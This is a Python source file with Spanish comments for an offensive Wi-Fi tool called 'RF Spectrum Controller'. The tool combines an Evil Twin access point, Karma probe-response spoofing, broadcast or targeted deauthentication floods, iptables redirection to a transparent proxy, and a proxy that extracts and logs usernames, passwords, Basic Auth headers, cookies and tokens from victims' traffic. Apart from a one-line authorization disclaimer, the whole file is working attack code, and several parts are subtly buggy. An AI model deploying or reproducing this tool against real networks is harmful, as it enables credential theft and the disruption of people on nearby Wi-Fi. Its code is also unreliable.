"""
RF Spectrum Controller - Motor de Ataque y Control del Espectro Wi-Fi para Shadow-Core.
Este módulo implementa técnicas avanzadas de manipulación de espectro Wi-Fi incluyendo:
- Evil Twin con Karma para atraer clientes
- Ataques de desautenticación controlados
- Captura de tráfico mediante proxy transparente
- Registro de actividad en tiempo real

⚠️ ADVERTENCIA: Este código está diseñado para uso en entornos controlados y con autorización explícita.
"""

import os
import sys
import threading
import time
import subprocess
import platform
import argparse
import logging
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11ProbeReq, Dot11ProbeResp, RadioTap
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.l2 import Ether
import http.server
import socketserver
import urllib.parse
import re
from io import BytesIO

# Configuración del módulo
MODULE_NAME = "RF Spectrum Controller"
MODULE_VERSION = "1.0.0"
LOG_FILE = "rf_spectrum_controller.log"
PROXY_PORT = 8080
Evil_TWIN_SSID = "Target_AP"
Evil_TWIN_CHANNEL = 6
Evil_TWIN_INTERFACE = "wlan0"
MONITOR_INTERFACE = "wlan1"
DEAUTH_PACKET_COUNT = 5
KARMA_RESPONSE_SSID = "Free_WiFi"  # SSID para responder a Probe Requests

# Configuración de logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logging.getLogger('').addHandler(console_handler)

# Estructura de datos para registrar clientes
client_logs = []
lock = threading.Lock()

def log_client_activity(mac, ssid, timestamp, event_type):
    """Registra la actividad de un cliente en el log."""
    with lock:
        client_logs.append({
            "timestamp": timestamp,
            "mac": mac,
            "ssid": ssid,
            "event_type": event_type
        })
        logging.info(f"📡 {event_type}: {mac} -> {ssid}")

def get_system_interfaces():
    """Obtiene las interfaces de red disponibles en el sistema."""
    try:
        if platform.system() == "Windows":
            # En Windows, usar netsh
            result = subprocess.run(['netsh', 'interface', 'show', 'interface'],
                                   capture_output=True, text=True)
            interfaces = []
            for line in result.stdout.split('\n'):
                if "Ethernet" in line or "Wireless" in line:
                    interface_name = line.split(':')[0].strip()
                    interfaces.append(interface_name)
            return interfaces
        else:
            # En Linux/macOS, usar ifconfig o ip
            return get_if_list()
    except Exception as e:
        logging.error(f"❌ Error al obtener interfaces: {e}")
        return []

def setup_evil_twin(ssid=Evil_TWIN_SSID, interface=Evil_TWIN_INTERFACE, channel=Evil_TWIN_CHANNEL):
    """
    Configura un Evil Twin usando hostapd (requiere privilegios root).
    """
    try:
        logging.info(f"🔧 Configurando Evil Twin en {interface} (SSID: {ssid}, Canal: {channel})")

        # Verificar que la interfaz exista
        available_interfaces = get_system_interfaces()
        if interface not in available_interfaces:
            logging.error(f"❌ Interfaz {interface} no encontrada. Interfaces disponibles: {available_interfaces}")
            return False

        # Configurar la interfaz en modo AP
        if platform.system() == "Linux":
            # Configurar interfaz en modo AP (Linux)
            logging.info(f"🔧 Configurando {interface} en modo AP...")
            subprocess.run(f"sudo ifconfig {interface} down", shell=True, check=True)
            subprocess.run(f"sudo iwconfig {interface} mode master", shell=True, check=True)
            subprocess.run(f"sudo ifconfig {interface} up", shell=True, check=True)

            # Configurar canal
            subprocess.run(f"sudo iwconfig {interface} channel {channel}", shell=True, check=True)

            # Configurar hostapd (requiere configuración previa)
            hostapd_config = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=shadow123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""

            with open("/tmp/hostapd.conf", "w") as f:
                f.write(hostapd_config)

            # Iniciar hostapd en segundo plano
            logging.info(f"🚀 Iniciando hostapd con SSID: {ssid}")
            hostapd_process = subprocess.Popen(
                ["sudo", "hostapd", "/tmp/hostapd.conf"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            # Esperar un momento para que hostapd inicie
            time.sleep(3)

            # Verificar que hostapd esté funcionando
            try:
                result = subprocess.run(
                    ["iwlist", interface, "channel"],
                    capture_output=True, text=True, timeout=5
                )
                if channel in result.stdout:
                    logging.info(f"✅ Evil Twin configurado correctamente en {interface} (Canal: {channel})")
                    return True, hostapd_process
                else:
                    logging.error("❌ hostapd no respondió correctamente")
                    return False, None
            except subprocess.TimeoutExpired:
                logging.error("❌ hostapd no respondió a tiempo")
                return False, None

        elif platform.system() == "Windows":
            # En Windows, usar netsh para crear un punto de acceso
            logging.info(f"🔧 Configurando Evil Twin en Windows con {interface}")
            try:
                # Crear perfil de red
                subprocess.run(
                    f"netsh wlan set hostednetwork mode=allow ssid={ssid} key=shadow123",
                    shell=True, check=True
                )
                subprocess.run(
                    f"netsh wlan start hostednetwork",
                    shell=True, check=True
                )
                logging.info(f"✅ Evil Twin configurado en Windows (SSID: {ssid})")
                return True, None
            except subprocess.CalledProcessError as e:
                logging.error(f"❌ Error al configurar Evil Twin en Windows: {e}")
                return False, None

        else:
            logging.error(f"❌ Sistema operativo no soportado: {platform.system()}")
            return False, None

    except Exception as e:
        logging.error(f"❌ Error al configurar Evil Twin: {e}")
        return False, None

def karma_sniffer(interface=MONITOR_INTERFACE):
    """
    Sniffer de Karma que responde a Probe Requests con un Probe Response falsificado.
    """
    def packet_handler(packet):
        if packet.haslayer(Dot11ProbeReq):
            # Extraer información del paquete Probe Request
            client_mac = packet[Dot11].addr2
            requested_ssids = []

            # Extraer SSIDs solicitados
            if packet.haslayer(Dot11Elt) and packet[Dot11Elt].ID == 0:  # SSID element
                ssid = packet[Dot11Elt].info.decode()
                requested_ssids.append(ssid)

            # Si no hay SSIDs específicos, responder con nuestro SSID de Karma
            target_ssid = KARMA_RESPONSE_SSID

            # Registrar la actividad del cliente
            timestamp = datetime.now().isoformat()
            log_client_activity(client_mac, target_ssid, timestamp, "probe_request")

            # Construir y enviar Probe Response falsificado
            probe_response = RadioTap()/Dot11(
                type=0,  # Management frame
                subtype=5,  # Probe Response
                addr1=client_mac,  # Destino (cliente)
                addr2="ff:ff:ff:ff:ff:ff",  # Direccion de broadcast
                addr3="00:11:22:33:44:55"  # Nuestra MAC (falsificada)
            )/Dot11Elt(
                ID=0,  # SSID element
                info=target_ssid  # Nuestro SSID de Karma
            )/Dot11Elt(
                ID=1,  # Supported rates
                info="\x82\x84\x8b\x96\x12\x18\x24\x30\x48\x60\x6c"
            )/Dot11Elt(
                ID=3,  # DS Parameter set
                info="\x01\x08"  # Current channel: 8 (4GHz)
            )

            # Enviar el paquete
            try:
                sendp(probe_response, iface=interface, verbose=False)
                logging.debug(f"📤 Enviado Probe Response a {client_mac} para SSID: {target_ssid}")
            except Exception as e:
                logging.error(f"❌ Error al enviar Probe Response: {e}")

    # Iniciar el sniffer en un hilo separado
    logging.info(f"🔍 Iniciando sniffer de Karma en {interface}")
    sniff(iface=interface,
          prn=packet_handler,
          filter="type mgt subtype 4",  # Solo Probe Requests
          store=0,
          timeout=None)

def deauth_target(bssid_ap, client_mac=None, count=DEAUTH_PACKET_COUNT):
    """
    Envía paquetes de desautenticación a un AP o cliente específico.
    """
    try:
        # Obtener la interfaz monitor
        interfaces = get_system_interfaces()
        monitor_interface = None
        for iface in interfaces:
            if "mon" in iface or "wlan" in iface:
                monitor_interface = iface
                break

        if not monitor_interface:
            logging.error("❌ No se encontró interfaz monitor disponible")
            return False

        # Construir el paquete de desautenticación
        if client_mac:
            # Desautenticar a un cliente específico
            deauth_packet = RadioTap()/Dot11(
                type=0,  # Management frame
                subtype=12,  # Deauthentication
                addr1=client_mac,  # Cliente destino
                addr2=bssid_ap,  # AP
                addr3=bssid_ap  # BSSID del AP
            )/Dot11Deauth(reason=7)  # Reason code 7: Class 3 frame from non-associated station

            logging.info(f"💥 Desautenticando cliente {client_mac} del AP {bssid_ap} ({count} paquetes)")
        else:
            # Desautenticar a todos los clientes del AP
            deauth_packet = RadioTap()/Dot11(
                type=0,  # Management frame
                subtype=12,  # Deauthentication
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2=bssid_ap,  # AP
                addr3=bssid_ap  # BSSID del AP
            )/Dot11Deauth(reason=7)  # Reason code 7: Class 3 frame from non-associated station

            logging.info(f"💥 Desautenticando todos los clientes del AP {bssid_ap} ({count} paquetes)")

        # Enviar los paquetes de desautenticación
        for i in range(count):
            try:
                sendp(deauth_packet, iface=monitor_interface, verbose=False)
                time.sleep(0.1)  # Pequeña pausa entre paquetes
            except Exception as e:
                logging.error(f"❌ Error al enviar paquete de desautenticación {i+1}/{count}: {e}")
                continue

        return True

    except Exception as e:
        logging.error(f"❌ Error en deauth_target: {e}")
        return False

def setup_proxy_rules(interface="wlan0", proxy_ip="127.0.0.1", proxy_port=PROXY_PORT):
    """
    Configura reglas de red para redirigir tráfico a través de un proxy.
    """
    try:
        if platform.system() == "Linux":
            # Configurar iptables para redirigir tráfico HTTP/HTTPS
            logging.info("🔧 Configurando reglas de iptables para proxy transparente")

            # Redirigir tráfico HTTP (puerto 80)
            subprocess.run(
                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", interface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(proxy_port)],
                check=True
            )

            # Redirigir tráfico HTTPS (puerto 443)
            subprocess.run(
                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", interface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(proxy_port)],
                check=True
            )

            # Permitir tráfico de salida
            subprocess.run(
                ["sudo", "iptables", "-A", "FORWARD", "-i", interface, "-j", "ACCEPT"],
                check=True
            )

            logging.info(f"✅ Reglas de iptables configuradas para redirigir tráfico a proxy en {proxy_ip}:{proxy_port}")

        elif platform.system() == "Windows":
            # En Windows, usar netsh para configurar el proxy
            logging.info("🔧 Configurando proxy en Windows")

            # Configurar proxy para el adaptador
            subprocess.run(
                f"netsh winhttp set proxy {proxy_ip}:{proxy_port}",
                shell=True, check=True
            )

            logging.info(f"✅ Proxy configurado en Windows: {proxy_ip}:{proxy_port}")

        else:
            logging.error(f"❌ Sistema operativo no soportado para configuración de proxy: {platform.system()}")
            return False

        return True

    except Exception as e:
        logging.error(f"❌ Error al configurar reglas de proxy: {e}")
        return False

class SimpleHTTPProxy(http.server.SimpleHTTPRequestHandler):
    """
    Proxy HTTP simple que intercepta y registra tráfico.
    """
    def do_GET(self):
        self.handle_request("GET")

    def do_POST(self):
        self.handle_request("POST")

    def handle_request(self, method):
        # Registrar la solicitud
        timestamp = datetime.now().isoformat()
        client_ip = self.client_address[0]
        url = urllib.parse.urlparse(self.path)
        query = url.query
        headers = dict(self.headers)
        body = self.rfile.read(int(self.headers.get('Content-Length', 0)))

        # Buscar credenciales en la URL o headers
        credentials = self.extract_credentials(query, headers, body)

        # Registrar la actividad
        log_entry = {
            "timestamp": timestamp,
            "method": method,
            "client_ip": client_ip,
            "url": url.geturl(),
            "query": query,
            "headers": headers,
            "body": body.decode('utf-8', errors='ignore') if body else None,
            "credentials": credentials
        }

        with lock:
            logging.info(f"📡 {method} {url.geturl()} desde {client_ip}")
            if credentials:
                logging.warning(f"🔐 Credenciales detectadas: {credentials}")

        # Reenviar la solicitud al destino original
        try:
            # Extraer el host y puerto del header Host
            host = self.headers.get('Host')
            if not host:
                logging.error("❌ No se encontró header Host")
                self.send_error(400, "Header Host requerido")
                return

            # Separar host y puerto
            if ':' in host:
                host, port = host.split(':')
                port = int(port)
            else:
                port = 80 if method == "GET" else 443

            # Conectar al servidor destino
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.settimeout(10)
            conn.connect((host, port))

            # Enviar la solicitud al servidor destino
            request_line = f"{method} {self.path} HTTP/1.1\r\n"
            for header, value in self.headers.items():
                if header.lower() != 'host':  # No enviar el header Host dos veces
                    request_line += f"{header}: {value}\r\n"
            request_line += f"Host: {host}\r\n"
            request_line += "\r\n"

            conn.sendall(request_line.encode('utf-8'))
            if body:
                conn.sendall(body)

            # Recibir y reenviar la respuesta
            response = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                response += chunk

            # Enviar la respuesta al cliente
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(response)

            conn.close()

        except Exception as e:
            logging.error(f"❌ Error al reenviar solicitud: {e}")
            self.send_error(500, "Error del proxy")

    def extract_credentials(self, query, headers, body):
        """Extrae credenciales de la URL, headers o cuerpo de la solicitud."""
        credentials = {}

        # Buscar en la query string
        if query:
            for pair in query.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    if key.lower() in ['user', 'username', 'email', 'login', 'auth']:
                        credentials[key] = value

        # Buscar en headers
        for header, value in headers.items():
            if header.lower() in ['authorization', 'proxy-authorization']:
                if 'basic' in value.lower():
                    # Extraer credenciales de Basic Auth
                    import base64
                    try:
                        decoded = base64.b64decode(value.split(' ')[1]).decode('utf-8')
                        if ':' in decoded:
                            username, password = decoded.split(':', 1)
                            credentials['username'] = username
                            credentials['password'] = password
                    except:
                        pass
            elif header.lower() == 'cookie':
                # Buscar cookies con nombres comunes
                for cookie in value.split(';'):
                    if '=' in cookie:
                        name, value = cookie.split('=', 1).strip()
                        if name.lower() in ['username', 'user', 'email', 'auth', 'session']:
                            credentials[name] = value

        # Buscar en el cuerpo (para POST)
        if body:
            body_str = body.decode('utf-8', errors='ignore')
            # Buscar patrones comunes de credenciales
            patterns = [
                (r'username=([^&]+)', 'username'),
                (r'user=([^&]+)', 'username'),
                (r'email=([^&]+)', 'email'),
                (r'login=([^&]+)', 'username'),
                (r'password=([^&]+)', 'password'),
                (r'auth=([^&]+)', 'auth_token'),
                (r'token=([^&]+)', 'auth_token')
            ]

            for pattern, field in patterns:
                match = re.search(pattern, body_str)
                if match:
                    credentials[field] = match.group(1)

        return credentials

def start_proxy_server(port=PROXY_PORT):
    """
    Inicia el servidor proxy en un hilo separado.
    """
    class ProxyHandler(SimpleHTTPProxy):
        pass

    def run_proxy():
        with socketserver.TCPServer(("", port), ProxyHandler) as httpd:
            logging.info(f"🚀 Proxy HTTP iniciado en el puerto {port}")
            httpd.serve_forever()

    proxy_thread = threading.Thread(target=run_proxy, daemon=True)
    proxy_thread.start()
    return proxy_thread

def main():
    """
    Función principal para orquestar el ataque.
    """
    parser = argparse.ArgumentParser(description=f"{MODULE_NAME} - Controlador del Espectro RF")
    parser.add_argument("--interface", help="Interfaz Wi-Fi para el Evil Twin (ej: wlan0)", default=Evil_TWIN_INTERFACE)
    parser.add_argument("--monitor-interface", help="Interfaz Wi-Fi en modo monitor (ej: wlan1)", default=MONITOR_INTERFACE)
    parser.add_argument("--ssid", help="SSID para el Evil Twin", default=Evil_TWIN_SSID)
    parser.add_argument("--channel", help="Canal para el Evil Twin", type=int, default=Evil_TWIN_CHANNEL)
    parser.add_argument("--target-ap", help="BSSID del AP objetivo para desautenticación")
    parser.add_argument("--target-client", help="MAC del cliente objetivo para desautenticación")
    parser.add_argument("--deauth-count", help="Número de paquetes de desautenticación", type=int, default=DEAUTH_PACKET_COUNT)
    args = parser.parse_args()

    # Iniciar el proxy
    proxy_thread = start_proxy_server()

    # Configurar Evil Twin
    evil_twin_success, hostapd_process = setup_evil_twin(
        ssid=args.ssid,
        interface=args.interface,
        channel=args.channel
    )

    if not evil_twin_success:
        logging.error("❌ No se pudo configurar el Evil Twin. Deteniendo el script.")
        return

    # Iniciar sniffer de Karma en un hilo separado
    def run_karma_sniffer():
        karma_sniffer(interface=args.monitor_interface)

    karma_thread = threading.Thread(target=run_karma_sniffer, daemon=True)
    karma_thread.start()

    # Esperar un momento para que todo esté listo
    time.sleep(5)

    # Configurar reglas de proxy
    setup_proxy_rules(interface=args.interface)

    logging.info(f"🎯 {MODULE_NAME} v{MODULE_VERSION} iniciado correctamente.")
    logging.info(f"📌 Evil Twin configurado: SSID={args.ssid}, Interfaz={args.interface}")
    logging.info(f"📌 Sniffer de Karma activo en {args.monitor_interface}")
    logging.info(f"📌 Proxy HTTP activo en el puerto {PROXY_PORT}")
    logging.info(f"📌 Esperando clientes...")

    # Si se proporcionó un AP objetivo, realizar ataque de desautenticación
    if args.target_ap:
        if args.target_client:
            deauth_target(args.target_ap, args.target_client, args.deauth_count)
            logging.info(f"💥 Ataque de desautenticación iniciado contra cliente {args.target_client} en AP {args.target_ap}")
        else:
            deauth_target(args.target_ap, None, args.deauth_count)
            logging.info(f"💥 Ataque de desautenticación iniciado contra todos los clientes en AP {args.target_ap}")

    # Esperar hasta que se presione Ctrl+C
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("🛑 Deteniendo RF Spectrum Controller...")

        # Limpiar reglas de proxy
        try:
            if platform.system() == "Linux":
                subprocess.run(
                    ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-i", args.interface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(PROXY_PORT)],
                    check=False
                )
                subprocess.run(
                    ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-i", args.interface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(PROXY_PORT)],
                    check=False
                )
        except:
            pass

        # Detener hostapd si está corriendo
        if hostapd_process:
            hostapd_process.terminate()
            logging.info("✅ hostapd detenido")

        logging.info("🎉 RF Spectrum Controller detenido correctamente.")

if __name__ == "__main__":
    # Verificar dependencias
    try:
        import scapy
        from scapy.layers.dot11 import *
    except ImportError as e:
        logging.error(f"❌ Dependencias no instaladas: {e}")
        logging.error("🔧 Instala las dependencias con: pip install scapy")
        sys.exit(1)

    main()